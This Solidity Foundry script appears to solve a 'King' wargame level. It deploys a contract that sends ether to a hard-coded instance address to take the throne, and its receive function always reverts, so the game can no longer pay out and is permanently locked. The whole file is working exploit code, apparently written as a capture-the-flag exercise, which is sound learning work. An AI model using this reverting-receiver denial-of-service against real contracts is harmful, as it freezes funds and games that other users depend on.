// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {King} from "../src/King.sol";

contract ExploitKing is Script {
    // address private constant spAddr = 0x2483b18646735073a880B5Ea30A6789cBD070F33;
    uint256 private immutable PRIVATE_KEY = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(PRIVATE_KEY);
        StopProclamation sp = new StopProclamation();
        sp.getMoney{value: 2000000000000000}();
        sp.becomeKing();
        vm.stopBroadcast();
    }
}

contract StopProclamation {
    error NO__DINERO();

    address payable private constant INSTANCE_ADDRESS = payable(0x7C375767aF35Eda2F25aF76Da7eeCA5C7a06bD64);

    function becomeKing() public {
        INSTANCE_ADDRESS.call{value: 1100000000000000}("");
    }

    function getMoney() public payable {}

    receive() external payable {
        revert NO__DINERO();
    }
}
